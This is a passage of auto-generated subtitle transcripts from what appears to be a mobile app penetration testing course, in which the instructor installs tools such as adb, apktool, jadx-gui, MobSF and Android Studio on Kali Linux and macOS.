if you choose to.

15
00:00:33.020 --> 00:00:35.160
Otherwise you can continue with the next four

16
00:00:35.160 --> 00:00:37.240
videos and see how to install the same

17
00:00:37.240 --> 00:00:38.400
tools manually.

18
00:00:39.220 --> 00:00:41.500
Okay so what we're going to be using

19
00:00:41.500 --> 00:00:43.860
is this github repo called pimpmykali.

20
00:00:44.300 --> 00:00:47.100
This is made and supported by someone in

21
00:00:47.100 --> 00:00:50.580
the TCM community called Daywalt and they have

22
00:00:50.580 --> 00:00:52.700
a bunch of different options in here not

23
00:00:52.700 --> 00:00:55.820
only for my course on TCM Academy, but

24
00:00:55.820 --> 00:00:58.760
also for other courses on TCM Academy as

25
00:00:58.760 --> 00:00:59.020
well.

26
00:00:59.240 --> 00:01:01.160
You can see there's a bunch of menu

27
00:01:01.160 --> 00:01:03.519
options here to install different things.

28
00:01:03.800 --> 00:01:08.100
If you're looking for specific types of installations

29
00:01:08.100 --> 00:01:12.580
such as the mayor movement pivoting persistence course

30
00:01:12.580 --> 00:01:16.280
is highlighted here, you know tools for just

31
00:01:16.280 --> 00:01:19.860
general pen testing, sublime text, all kinds of

32
00:01:19.860 --> 00:01:22.140
different convenient tools that are part of the

33
00:01:22.140 --> 00:01:22.460
script.

34
00:01:22.660 --> 00:01:24.180
So how we're going to use this script

35
00:01:24.180 --> 00:01:25.600
we're just going to do a quick git

36
00:01:25.600 --> 00:01:29.240
clone here of the repository and this is

37
00:01:29.240 --> 00:01:32.420
a brand new Kali Linux box that I

38
00:01:32.420 --> 00:01:35.400
have right here so everything is completely new.

39
00:01:35.740 --> 00:01:37.120
So let me make this a little bit

40
00:01:37.120 --> 00:01:43.300
bigger for you and all we're going to

41
00:01:43.300 --> 00:01:48.450
do here is just git clone that repo

42
00:01:48.450 --> 00:01:51.770
then we're going to cd into the pimpmykali

43
00:01:51.770 --> 00:01:53.470
folder once it's created here.

44
00:01:54.290 --> 00:01:59.170
So cd pimpmykali and then we're just going

45
00:01:59.170 --> 00:02:02.350
to just run a sudo dot slash pimpmykali

46
00:02:02.350 --> 00:02:05.330
.sh. Okay it's going to ask us for

47
00:02:05.330 --> 00:02:09.690
our administrator password here and here we go.

48
00:02:09.970 --> 00:02:13.410
Everything that you need to do is just

49
00:02:13.410 --> 00:02:16.810
select the option A here, the mapped course

50
00:02:16.810 --> 00:02:19.510
setup, that's mobile application penetration tester.

51
00:02:20.150 --> 00:02:22.270
So I'm going to just press A and

52
00:02:22.270 --> 00:02:24.670
it's going to start installing everything we're going

53
00:02:24.670 --> 00:02:27.210
to need for our course here.

54
00:02:29.100 --> 00:02:30.660
I'm going to give this a few minutes

55
00:02:30.660 --> 00:02:32.540
and I'll see you at the end when

56
00:02:32.540 --> 00:02:33.760
this is done installing.

57
00:02:35.040 --> 00:02:38.320
Okay and here I have finally finished installing

58
00:02:38.320 --> 00:02:40.140
all the tools from pimpmykali.

59
00:02:40.340 --> 00:02:43.320
Please pause the video now if you have

60
00:02:43.320 --> 00:02:45.340
not finished installing the tools yet.

61
00:02:45.900 --> 00:02:47.900
All right so let's now validate that everything

62
00:02:47.900 --> 00:02:49.340
was installed successfully.

63
00:02:49.460 --> 00:02:50.660
I'm just going to clear out my terminal

64
00:02:50.660 --> 00:02:53.520
here and now that I've used pimpmykali I

65
00:02:53.520 --> 00:02:55.340
just want to test a few commands you're

66
00:02:55.340 --> 00:02:56.620
going to need throughout this course.

67
00:02:56.820 --> 00:02:58.660
One of those is going to be adb.

68
00:02:58.820 --> 00:03:01.620
You just want to see this page here,

69
00:03:01.660 --> 00:03:02.460
the man page.

70
00:03:02.820 --> 00:03:04.160
Do apk tool here.

71
00:03:04.820 --> 00:03:06.700
This also shows you a man page.

72
00:03:06.780 --> 00:03:07.980
We're going to need that tool later.

73
00:03:08.520 --> 00:03:11.760
You can also do a jadex-gui and

74
00:03:11.760 --> 00:03:13.760
this will open the jadex-gui here.

75
00:03:14.460 --> 00:03:16.380
That's how we know that tool is successfully

76
00:03:16.380 --> 00:03:16.960
installed.

77
00:03:17.400 --> 00:03:19.280
When we get further along in this course

78
00:03:19.280 --> 00:03:20.840
we're also going to be talking about a

79
00:03:20.840 --> 00:03:22.260
tool called mobsf.

80
00:03:22.620 --> 00:03:25.120
Now in those videos I mentioned that you

81
00:03:25.120 --> 00:03:27.140
should download it from github but if you

82
00:03:27.140 --> 00:03:30.900
use this pimpmykali route you can find mobsf

83
00:03:30.900 --> 00:03:33.680
right here in the opt directory under mobile

84
00:03:33.680 --> 00:03:35.820
security framework-mobsf.

85
00:03:36.220 --> 00:03:37.600
If we do an ls here you can

86
00:03:37.600 --> 00:03:40.260
see we have our setup.sh, we have

87
00:03:40.260 --> 00:03:43.340
our run.sh. You're going to have to

88
00:03:43.340 --> 00:03:46.140
run these scripts just to set up everything

89
00:03:46.140 --> 00:03:48.260
just like I show in the further videos

90
00:03:48.260 --> 00:03:51.200
with mobsf but otherwise if you have all

91
00:03:51.200 --> 00:03:53.760
these tools and you use pimpmykali you should

92
00:03:53.760 --> 00:03:56.040
be pretty good to go with all the

93
00:03:56.040 --> 00:03:57.420
tools for this course.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.140 --> 00:00:03.040
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, let's instal adb for Kali Linux.

2
00:00:03.220 --> 00:00:04.240
This one's very easy.

3
00:00:04.420 --> 00:00:05.960
All we need to do is a sudo

4
00:00:05.960 --> 00:00:10.960
apt-get instal adb and this will instal

5
00:00:10.960 --> 00:00:13.380
our adb package and as long as we're

6
00:00:13.380 --> 00:00:15.640
able to run the command adb and get

7
00:00:15.640 --> 00:00:17.760
this manual you should be good to go

8
00:00:17.760 --> 00:00:18.900
on Kali Linux.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.640 --> 00:00:02.400
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, the next tool we're going to install

2
00:00:02.400 --> 00:00:05.300
on Kali Linux is a tool called APK

3
00:00:05.300 --> 00:00:05.620
Tool.

4
00:00:06.120 --> 00:00:07.900
We go up to Google and look for

5
00:00:07.900 --> 00:00:08.120
that.

6
00:00:08.240 --> 00:00:11.280
We'll find this under the iboppeaches.github.io

7
00:00:11.280 --> 00:00:15.180
and basically what APK Tool does is it

8
00:00:15.180 --> 00:00:18.420
allows us to reverse engineer our Android APK

9
00:00:18.420 --> 00:00:18.860
files.

10
00:00:19.440 --> 00:00:24.720
It automatically kind of decompiles the file into

11
00:00:24.720 --> 00:00:27.160
its individual components and we'll be able to

12
00:00:27.160 --> 00:00:28.940
go through and look through those when we're

13
00:00:28.940 --> 00:00:30.540
doing our static analysis.

14
00:00:31.060 --> 00:00:33.140
So this tool is very easy to install

15
00:00:33.140 --> 00:00:34.040
on Kali Linux.

16
00:00:34.260 --> 00:00:36.640
Let me pull up my terminal here.

17
00:00:36.760 --> 00:00:38.400
All we need to do is a sudo

18
00:00:38.400 --> 00:00:41.400
apt-get install.

19
00:00:42.460 --> 00:00:46.100
I have a misspelling here and then we're

20
00:00:46.100 --> 00:00:47.920
going to do APK Tool.

21
00:00:48.360 --> 00:00:53.080
Let me actually type that out and this

22
00:00:53.080 --> 00:00:54.720
will install everything we need.

23
00:00:56.120 --> 00:00:58.660
Okay and to validate that APK Tool is

24
00:00:58.660 --> 00:01:00.720
working properly all we need to do is

25
00:01:00.720 --> 00:01:04.220
type in APK Tool and once we see

26
00:01:04.220 --> 00:01:06.640
this manual page with all our different options

27
00:01:06.640 --> 00:01:08.180
for the tool we should be good to

28
00:01:08.180 --> 00:01:10.700
go for APK Tool on Kali Linux.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.010 --> 00:00:03.370
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, let's install Jadix GUI for Kali Linux.

2
00:00:03.850 --> 00:00:05.530
Now the first thing you're going to need

3
00:00:05.530 --> 00:00:08.150
to do is actually install Java.

4
00:00:08.790 --> 00:00:10.830
And how we can do that with Kali,

5
00:00:10.990 --> 00:00:12.910
it's pretty easy since we have a nice

6
00:00:12.910 --> 00:00:13.710
package manager.

7
00:00:14.210 --> 00:00:18.410
We can just do sudo apt-get install

8
00:00:18.410 --> 00:00:22.730
default-jdk, just like this.

9
00:00:23.370 --> 00:00:24.990
And then you'll have to enter your password

10
00:00:24.990 --> 00:00:26.010
for your root user.

11
00:00:26.630 --> 00:00:28.970
And it will run here, and you do

12
00:00:28.970 --> 00:00:29.370
yes.

13
00:00:34.500 --> 00:00:36.740
It'll take just a few seconds and install

14
00:00:36.740 --> 00:00:37.260
the tool.

15
00:01:05.040 --> 00:01:07.240
Okay, now that that's installed, all we need

16
00:01:07.240 --> 00:01:09.780
to do is make sure that Java works

17
00:01:09.780 --> 00:01:10.500
properly.

18
00:01:10.680 --> 00:01:13.140
So we're going to do java space dash

19
00:01:13.140 --> 00:01:16.540
dash version to verify our version of Java

20
00:01:16.540 --> 00:01:17.240
that's installed.

21
00:01:17.920 --> 00:01:20.860
You can see we have our Java installed.

22
00:01:20.860 --> 00:01:22.900
Now I'm going to clear this out so

23
00:01:22.900 --> 00:01:25.400
you can see and do a sudo apt

24
00:01:25.400 --> 00:01:29.200
-get install jadx.

25
00:01:29.320 --> 00:01:31.040
And this is how it's going to install

26
00:01:31.040 --> 00:01:32.500
our tool, Jadix GUI.

27
00:01:33.940 --> 00:01:35.640
Okay, and you can see here that I

28
00:01:35.640 --> 00:01:38.300
actually already have this installed, but it will

29
00:01:38.300 --> 00:01:39.500
work now regardless.

30
00:01:39.720 --> 00:01:41.300
You will have to click Y and then

31
00:01:41.300 --> 00:01:43.280
install the package as well.

32
00:01:44.300 --> 00:01:46.300
And how we can make Jadix run on

33
00:01:46.300 --> 00:01:49.520
our Kali Linux is do jadix-gui.

34
00:01:49.520 --> 00:01:51.200
And that's all we need to do, and

35
00:01:51.200 --> 00:01:54.620
it's going to start the UI version of

36
00:01:54.620 --> 00:01:54.940
Jadix.

37
00:01:55.020 --> 00:01:56.360
You can see here that we're now able

38
00:01:56.360 --> 00:01:57.600
to open our file.

39
00:01:58.460 --> 00:02:02.120
And from here, once we download our application

40
00:02:02.120 --> 00:02:04.520
off the Google Play Store, we'll be able

41
00:02:04.520 --> 00:02:06.920
to import this right into Jadix.

42
00:02:07.039 --> 00:02:08.960
So, for example, on my desktop, I already

43
00:02:08.960 --> 00:02:10.260
have Android here.

44
00:02:10.800 --> 00:02:12.980
Just for an example, I'll open it right

45
00:02:12.980 --> 00:02:13.280
now.

46
00:02:15.270 --> 00:02:18.410
And as long as this works successfully, everything

47
00:02:18.410 --> 00:02:20.750
should be just fine for Jadix.

48
00:02:20.750 --> 00:02:22.970
So you can see here that the application

49
00:02:22.970 --> 00:02:24.590
has come up, and then we'll go through

50
00:02:24.590 --> 00:02:27.150
the actual static analysis process from here.

51
00:02:28.310 --> 00:02:29.450
So if you made it this far in

52
00:02:29.450 --> 00:02:32.310
the video, Jadix GUI is properly installed on

53
00:02:32.310 --> 00:02:32.890
Kali Linux.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.540 --> 00:00:02.580
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay let's talk now about how to instal

2
00:00:02.580 --> 00:00:04.800
Android Studio on Kali Linux.

3
00:00:05.840 --> 00:00:07.820
Now here I am in Google and all

4
00:00:07.820 --> 00:00:09.280
you need to do is go out and

5
00:00:09.280 --> 00:00:10.840
search for Android Studio.

6
00:00:13.590 --> 00:00:15.230
It's going to be this first hit developer

7
00:00:15.230 --> 00:00:18.250
-.android.com Android-Studio.

8
00:00:18.510 --> 00:00:20.610
Now before we do this there's going to

9
00:00:20.610 --> 00:00:22.950
be two notes I want to make when

10
00:00:22.950 --> 00:00:24.250
it comes to Kali Linux.

11
00:00:25.390 --> 00:00:28.090
So first you're going to need Java installed.

12
00:00:28.210 --> 00:00:29.550
If you have not done that yet go

13
00:00:29.550 --> 00:00:31.870
back and look at JattX video so that

14
00:00:31.870 --> 00:00:33.890
you have Java properly installed.

15
00:00:34.710 --> 00:00:37.630
Also something to note is that I am

16
00:00:37.630 --> 00:00:40.130
on a virtual machine for my Kali Linux

17
00:00:40.130 --> 00:00:40.990
machine right now.

18
00:00:41.590 --> 00:00:45.610
And this video is really only if you

19
00:00:45.610 --> 00:00:51.450
are using a physical Kali Linux machine because

20
00:00:51.450 --> 00:00:54.350
if I try to instal Android Studio on

21
00:00:54.350 --> 00:00:57.050
a virtual machine and then I try to

22
00:00:57.050 --> 00:00:59.710
make an emulator run on that virtual machine

23
00:00:59.710 --> 00:01:02.270
I'm not going to get very good performance

24
00:01:02.270 --> 00:01:04.810
or it may cause my virtual machine to

25
00:01:04.810 --> 00:01:05.290
crash.

26
00:01:05.950 --> 00:01:08.550
So just for the purposes of demonstrating this

27
00:01:08.550 --> 00:01:12.370
installation I am using a virtual machine but

28
00:01:12.370 --> 00:01:14.390
if you're going to be using Android Studio

29
00:01:14.390 --> 00:01:18.110
and emulators on your Kali Linux box I

30
00:01:18.110 --> 00:01:20.730
highly recommend that it's a physical box as

31
00:01:20.730 --> 00:01:22.590
opposed to a virtual machine.

32
00:01:23.190 --> 00:01:25.090
So now that we're here on the Android

33
00:01:25.090 --> 00:01:28.790
Studio menu let's click download Android Studio and

34
00:01:28.790 --> 00:01:30.910
this will download the package for us.

35
00:01:31.210 --> 00:01:33.670
We gotta scroll down past the terms and

36
00:01:33.670 --> 00:01:36.250
conditions here, click I've read the terms and

37
00:01:36.250 --> 00:01:38.610
conditions, and click download Android Studio.

38
00:01:39.110 --> 00:01:41.430
Now I'm going to click and save this

39
00:01:41.430 --> 00:01:42.830
file to my downloads.

40
00:01:45.190 --> 00:01:48.030
I earned a badge here according to Android

41
00:01:48.030 --> 00:01:50.530
and now it will take a few minutes

42
00:01:50.530 --> 00:01:51.170
to download.

43
00:01:51.930 --> 00:01:53.690
So you can see in our downloads folder

44
00:01:53.690 --> 00:01:55.790
that now the package is here.

45
00:01:55.890 --> 00:01:58.130
I'm going to double click this and this

46
00:01:58.130 --> 00:02:00.670
will allow us to extract the data out

47
00:02:00.670 --> 00:02:01.330
of this folder.

48
00:02:01.650 --> 00:02:03.910
You could also go to the terminal and

49
00:02:03.910 --> 00:02:08.970
use like gzip or geonzip to extract this

50
00:02:08.970 --> 00:02:09.970
data as well.

51
00:02:10.410 --> 00:02:11.790
So it's going to read out of the

52
00:02:11.790 --> 00:02:13.950
folder here that I'm going to extract this

53
00:02:13.950 --> 00:02:15.970
folder as soon as it's done reading the

54
00:02:15.970 --> 00:02:16.210
data.

55
00:02:16.730 --> 00:02:17.930
Okay so here we are I'm going to

56
00:02:17.930 --> 00:02:18.830
click extract.

57
00:02:19.670 --> 00:02:22.230
Let's click extract it will pull all the

58
00:02:22.230 --> 00:02:24.790
data out of those folders and it will

59
00:02:24.790 --> 00:02:26.870
be able to let us run Android Studio

60
00:02:26.870 --> 00:02:27.950
for the first time.

61
00:02:29.070 --> 00:02:31.610
Okay now that we've extracted the Android Studio

62
00:02:31.610 --> 00:02:34.430
folder out of our downloads folder we can

63
00:02:34.430 --> 00:02:37.050
click into Android Studio then go to bin

64
00:02:37.050 --> 00:02:40.070
here and we should see this studio.sh

65
00:02:40.070 --> 00:02:40.510
script.

66
00:02:40.790 --> 00:02:42.550
I'm going to open this in our terminal

67
00:02:42.550 --> 00:02:44.030
so I'm going to open a new terminal

68
00:02:44.030 --> 00:02:48.330
here do a cd to downloads and then

69
00:02:48.330 --> 00:02:51.970
to Android Studio then to bin and then

70
00:02:51.970 --> 00:02:54.030
I'm going to do a dot slash studio

71
00:02:54.030 --> 00:02:58.250
.sh and this will run Android Studio for

72
00:02:58.250 --> 00:02:59.130
the first time.

73
00:02:59.450 --> 00:03:02.230
Now if you wanted to instal Android Studio

74
00:03:02.230 --> 00:03:05.410
for multiple users on a Kali Linux device

75
00:03:05.410 --> 00:03:08.790
you could move that entire Android Studio folder

76
00:03:08.790 --> 00:03:11.970
over to the opt folder that will allow

77
00:03:11.970 --> 00:03:13.650
it to run for multiple users.

78
00:03:14.150 --> 00:03:15.850
You can also do it in your slash

79
00:03:15.850 --> 00:03:19.710
user slash local if you wanted to have

80
00:03:19.710 --> 00:03:21.910
that installed for just one user.

81
00:03:22.750 --> 00:03:25.230
So here is the Android setup window it's

82
00:03:25.230 --> 00:03:27.290
going to tell us no Android SDK found

83
00:03:27.290 --> 00:03:29.070
we have to download some things here.

84
00:03:29.550 --> 00:03:31.670
I'm going to click next next and just

85
00:03:31.670 --> 00:03:33.270
accept all the defaults here.

86
00:03:33.530 --> 00:03:36.370
We'll start downloading all the additional tools that

87
00:03:36.370 --> 00:03:38.210
you're going to need to make Android Studio

88
00:03:38.210 --> 00:03:39.350
run properly.

89
00:03:40.070 --> 00:03:41.870
So this will take a few minutes to

90
00:03:41.870 --> 00:03:42.350
download.

91
00:03:45.040 --> 00:03:47.400
Okay and now Android Studio has been updated

92
00:03:47.400 --> 00:03:49.060
we downloaded all our dependencies.

93
00:03:49.540 --> 00:03:53.800
We'll click finish here and now we should

94
00:03:53.800 --> 00:03:57.200
be at our Android Studio project creation page

95
00:03:57.200 --> 00:03:58.580
and this is where we're going to end

96
00:03:58.580 --> 00:04:01.120
this video because now Android Studio has been

97
00:04:01.120 --> 00:04:02.160
properly installed.

98
00:04:02.720 --> 00:04:04.880
But if we wanted to start a new

99
00:04:04.880 --> 00:04:06.980
project we could click new project or we

100
00:04:06.980 --> 00:04:09.900
could also open a APK here and it

101
00:04:09.900 --> 00:04:13.360
would import the APK right into Android Studio.

102
00:04:13.860 --> 00:04:15.440
Show you how to do that stuff later

103
00:04:15.440 --> 00:04:16.899
but if you made it this far in

104
00:04:16.899 --> 00:04:19.459
the video then you're good and Android Studio

105
00:04:19.459 --> 00:04:21.960
should be installed properly on Kali Linux.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:01.290 --> 00:00:03.950
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, let's go ahead and install all the

2
00:00:03.950 --> 00:00:05.930
tools we're going to need for our MacBook.

3
00:00:06.530 --> 00:00:08.290
Now the first thing I'm going to install

4
00:00:08.290 --> 00:00:10.370
here is going to be a tool called

5
00:00:10.370 --> 00:00:12.430
brew, and if you've never heard of brew

6
00:00:12.430 --> 00:00:15.190
before this is basically a great package manager

7
00:00:15.190 --> 00:00:16.850
utilized for Mac OS.

8
00:00:17.370 --> 00:00:19.050
All you need to do is search on

9
00:00:19.050 --> 00:00:21.930
Google for brew, it's on brew.sh here,

10
00:00:22.310 --> 00:00:23.870
and then you're just going to copy this

11
00:00:23.870 --> 00:00:26.030
script here and you're going to use this

12
00:00:26.030 --> 00:00:26.990
in a terminal.

13
00:00:27.570 --> 00:00:29.170
Let me make the terminal a bit bigger

14
00:00:29.170 --> 00:00:33.050
here so that you can see properly, and

15
00:00:33.050 --> 00:00:35.450
so I'm just going to paste that command

16
00:00:35.450 --> 00:00:38.050
right into my script here and press enter.

17
00:00:38.630 --> 00:00:41.090
It's going to require you to use sudo

18
00:00:41.090 --> 00:00:43.250
so you need to enter your password there,

19
00:00:44.030 --> 00:00:48.390
and this will start to install the brew

20
00:00:48.390 --> 00:00:50.530
package manager here, and this is going to

21
00:00:50.530 --> 00:00:52.830
allow us to quickly install a few other

22
00:00:52.830 --> 00:00:55.270
tools on MacBook just really easily.

23
00:00:55.850 --> 00:00:57.870
So once this is done loading we'll go

24
00:00:57.870 --> 00:00:59.910
into the next part, show you how to

25
00:00:59.910 --> 00:01:03.430
install apk tool, how to install jadex as

26
00:01:03.430 --> 00:01:05.450
well, so we can do our static analysis

27
00:01:05.450 --> 00:01:06.110
properly.

28
00:01:09.780 --> 00:01:12.620
Okay, so now brew has been installed successfully,

29
00:01:12.960 --> 00:01:14.480
and now we can just do like the

30
00:01:14.480 --> 00:01:16.440
command brew to make sure everything is okay.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.460 --> 00:00:02.640
(Transcribed by TurboScribe. Go Unlimited to remove this message.) I'm going to do a brew instal, and

2
00:00:02.640 --> 00:00:04.800
then I'm going to do JADX, and this

3
00:00:04.800 --> 00:00:06.920
is how we're going to instal JADX GUI

4
00:00:06.920 --> 00:00:08.540
for our MacBook here.

5
00:00:08.960 --> 00:00:10.880
It's going to take a minute and find

6
00:00:10.880 --> 00:00:14.720
this JADX package, and instal everything automatically and

7
00:00:14.720 --> 00:00:17.200
super easily for Mac.

8
00:00:17.520 --> 00:00:19.520
You can see here that I already have

9
00:00:19.520 --> 00:00:23.380
JADX installed, and now if I wanted to

10
00:00:23.380 --> 00:00:24.800
run this tool, all I have to do

11
00:00:24.800 --> 00:00:27.540
is type in JADX-GUI from my terminal,

12
00:00:27.540 --> 00:00:30.340
and this will start to open JADX in

13
00:00:30.340 --> 00:00:32.380
the background, then we'll be able to open

14
00:00:32.380 --> 00:00:33.820
our APKs from there.

15
00:00:33.900 --> 00:00:37.600
You can see it's opening here, and here

16
00:00:37.600 --> 00:00:39.380
we can see that we can get access

17
00:00:39.380 --> 00:00:40.980
to our file system, so if you made

18
00:00:40.980 --> 00:00:44.580
it this far, you have JADX GUI operating

19
00:00:44.580 --> 00:00:45.240
successfully.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.400 --> 00:00:02.180
(Transcribed by TurboScribe. Go Unlimited to remove this message.) The next tool we're going to install using

2
00:00:02.180 --> 00:00:04.460
brew is just apk tool, so we're going

3
00:00:04.460 --> 00:00:08.540
to do brew install apk tool, and this

4
00:00:08.540 --> 00:00:12.420
will also install this tool automatically very easily

5
00:00:12.420 --> 00:00:14.860
using brew, which is why I like brew

6
00:00:14.860 --> 00:00:16.700
a lot, because you can install a bunch

7
00:00:16.700 --> 00:00:19.800
of different tools very easily, it'll download everything

8
00:00:19.800 --> 00:00:24.200
automatically, and install everything super easily without very

9
00:00:24.200 --> 00:00:26.940
much manual installation.

10
00:00:33.670 --> 00:00:35.790
Okay so now it looks like apk tool

11
00:00:35.790 --> 00:00:37.850
was installed successfully, and I'm just going to

12
00:00:37.850 --> 00:00:39.930
do apk tool here to see the menu,

13
00:00:40.030 --> 00:00:43.710
make sure the tool actually applied here, and

14
00:00:43.710 --> 00:00:46.810
you can see that it successfully applied.


━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEBVTT

1
00:00:00.070 --> 00:00:02.010
(Transcribed by TurboScribe. Go Unlimited to remove this message.) Okay, now the next thing I'm going to

2
00:00:02.010 --> 00:00:04.970
do is just instal Android Studio for Mac.

3
00:00:05.050 --> 00:00:07.090
I'm just going to do a quick Android

4
00:00:07.090 --> 00:00:10.930
Studio search here and go to developer.android

5
00:00:10.930 --> 00:00:11.490
.com.

6
00:00:11.570 --> 00:00:13.590
We're going to instal Android Studio just like

7
00:00:13.590 --> 00:00:16.090
we did for Windows and Linux as well,

8
00:00:16.170 --> 00:00:17.470
straight off the website here.

9
00:00:17.890 --> 00:00:20.330
Click download Android Studio for Mac.

10
00:00:23.360 --> 00:00:25.940
It'll start downloading after we accept the terms

11
00:00:25.940 --> 00:00:26.500
and conditions.

12
00:00:35.410 --> 00:00:36.910
There's our terms and conditions.

13
00:00:37.010 --> 00:00:38.410
I'm going to scroll down, click I have

14
00:00:38.410 --> 00:00:40.790
read the terms and conditions, and here for

15
00:00:40.790 --> 00:00:43.070
Mac you have to choose which type of

16
00:00:43.070 --> 00:00:43.710
chip you have.

17
00:00:44.050 --> 00:00:45.670
If you have a brand new MacBook that

18
00:00:45.670 --> 00:00:49.310
I think is like 2020 or later, it

19
00:00:49.310 --> 00:00:51.090
will have the Apple chip inside of it.

20
00:00:51.150 --> 00:00:52.670
If you have an older MacBook like the

21
00:00:52.670 --> 00:00:54.530
one I have, it's going to have an

22
00:00:54.530 --> 00:00:55.910
Intel chip inside of it.

23
00:00:56.350 --> 00:00:57.790
So I'm going to click Mac with the

24
00:00:57.790 --> 00:00:58.570
Intel chip.

25
00:00:58.830 --> 00:01:01.190
It's going to start downloading Android Studio right

26
00:01:01.190 --> 00:01:01.510
here.

27
00:01:02.790 --> 00:01:04.650
We'll give that a few minutes to download.

28
00:01:07.310 --> 00:01:09.610
Okay, now it seems that Android Studio has

29
00:01:09.610 --> 00:01:10.630
downloaded successfully.

30
00:01:10.730 --> 00:01:13.190
I'm going to click open here, and just

31
00:01:13.190 --> 00:01:15.570
like any package with a MacBook, you're going

32
00:01:15.570 --> 00:01:17.950
to need to drag this file into the

33
00:01:17.950 --> 00:01:19.050
applications folder.

34
00:01:22.300 --> 00:01:23.980
It should pop up here in a second.

35
00:01:27.300 --> 00:01:28.780
There it was, it was opening it.

36
00:01:30.060 --> 00:01:31.340
Opening Android Studio.

37
00:01:33.310 --> 00:01:35.290
It's going to verify the file, and then

38
00:01:35.290 --> 00:01:38.370
we'll have to drag this downloaded file, the

39
00:01:38.370 --> 00:01:41.190
application, into the applications folder so that it

40
00:01:41.190 --> 00:01:42.630
runs successfully on our MacBook.

41
00:01:48.120 --> 00:01:48.840
There we go.

42
00:01:48.900 --> 00:01:50.360
Now we're just going to drag this Android

43
00:01:50.360 --> 00:01:53.140
Studio to app to the applications folder here.

44
00:01:54.280 --> 00:01:57.160
This is very similar for installing anything on

45
00:01:57.160 --> 00:01:57.560
a MacBook.

46
00:02:01.720 --> 00:02:03.960
Okay, now it's going to decompress this file.

47
00:02:04.100 --> 00:02:05.600
It will take just a few minutes to

48
00:02:05.600 --> 00:02:08.919
open everything and copy Android Studio to our

49
00:02:08.919 --> 00:02:09.960
applications folder.

50
00:02:16.290 --> 00:02:18.570
Okay, so now that Android Studio has been

51
00:02:18.570 --> 00:02:21.370
dragged over to our applications folder, I should

52
00:02:21.370 --> 00:02:26.930
be able to open it just here in

53
00:02:26.930 --> 00:02:27.650
my finder.

54
00:02:34.360 --> 00:02:36.260
Okay, it's verifying the application.

55
00:02:36.520 --> 00:02:39.460
It should open up here with our setup

56
00:02:39.460 --> 00:02:41.920
menu and everything in just a second.

57
00:02:45.890 --> 00:02:48.230
Okay, it's going to say that androidstudio.app

58
00:02:48.230 --> 00:02:49.670
has an app downloaded from the internet.

59
00:02:49.790 --> 00:02:50.850
Are we sure we want to open it?

60
00:02:50.870 --> 00:02:52.030
We're just going to click open.

61
00:03:04.650 --> 00:03:06.350
I'm going to click allow on the notifications

62
00:03:06.350 --> 00:03:06.750
there.

63
00:03:10.560 --> 00:03:12.820
Okay, and Android Studio is now starting up.

64
00:03:14.790 --> 00:03:17.050
It'll take just a minute to get everything

65
00:03:17.050 --> 00:03:17.870
started here.

66
00:03:25.710 --> 00:03:27.450
Okay, you can see here that I'm loading

67
00:03:27.450 --> 00:03:29.770
a testapp2 project that I made.

68
00:03:30.170 --> 00:03:32.010
This is just a project that I loaded

69
00:03:32.010 --> 00:03:35.190
previously, and it's just loading it up from

70
00:03:35.190 --> 00:03:36.230
a previous run.

71
00:03:36.730 --> 00:03:38.250
Now when you run this for the first

72
00:03:38.250 --> 00:03:40.050
time, you might have to accept some default

73
00:03:40.050 --> 00:03:43.850
configurations, and then when you get to a

74
00:03:43.850 --> 00:03:46.170
new project creation screen, you can just do

75
00:03:46.170 --> 00:03:48.130
a new project, name it whatever you want

76
00:03:48.130 --> 00:03:49.750
to, and then you should be able to

77
00:03:49.750 --> 00:03:51.670
get to this kind of an area here

78
00:03:51.670 --> 00:03:53.710
where you'll be able to look through like

79
00:03:53.710 --> 00:03:57.190
the project folders and interact with Android Studio

80
00:03:57.190 --> 00:03:57.870
correctly.

81
00:03:58.690 --> 00:03:59.930
So it's just going to take a second

82
00:03:59.930 --> 00:04:01.830
to prepare my workspace and bring up everything

83
00:04:01.830 --> 00:04:05.510
I was working on before, but at this

84
00:04:05.510 --> 00:04:07.930
point pretty much Android Studio should be set

85
00:04:07.930 --> 00:04:08.570
up properly.

86
00:04:08.790 --> 00:04:09.950
Everything should be working.

87
00:04:12.690 --> 00:04:18.510
Yep, slowly loading here, and yep, if we've

88
00:04:18.510 --> 00:04:19.990
made it this far where we can actually

89
00:04:19.990 --> 00:04:22.970
see some information about our project and have

90
00:04:22.970 --> 00:04:25.450
these different file tabs and everything, and the

91
00:04:25.450 --> 00:04:26.890
screen looks like this, you should be good

92
00:04:26.890 --> 00:04:28.830
to go with Android Studio for the rest

93
00:04:28.830 --> 00:04:29.570
of this course.

94
00:04:30.050 --> 00:04:32.030
This is going to work very similarly to

95
00:04:32.030 --> 00:04:33.910
how it works in Windows with the emulators

96
00:04:33.910 --> 00:04:34.490
and everything.

97
00:04:34.950 --> 00:04:36.510
You should be able to follow along with

98
00:04:36.510 --> 00:04:38.910
like the emulator setup through the AVD manager

99
00:04:38.910 --> 00:04:41.950
and everything else from this point on, regardless

100
00:04:41.950 --> 00:04:44.710
of which operating system you're using Android Studio

101
00:04:44.710 --> 00:04:45.150
on.

102
00:04:56.400 --> 00:04:58.520
Okay, and one more tool that we're going

103
00:04:58.520 --> 00:05:01.700
to instal here for MacBook is the Android

104
00:05:01.700 --> 00:05:02.680
Platform Tools.

105
00:05:03.000 --> 00:05:05.180
We can do this through brew as well,

106
00:05:05.360 --> 00:05:07.440
and we can just do a brew instal

107
00:05:07.440 --> 00:05:17.280
android-platform-tools, and this is

108
00:05:17.280 --> 00:05:21.720
going to instal things like ADB, Fastboot, and

109
00:05:21.720 --> 00:05:23.620
other tools like that that we're going to

110
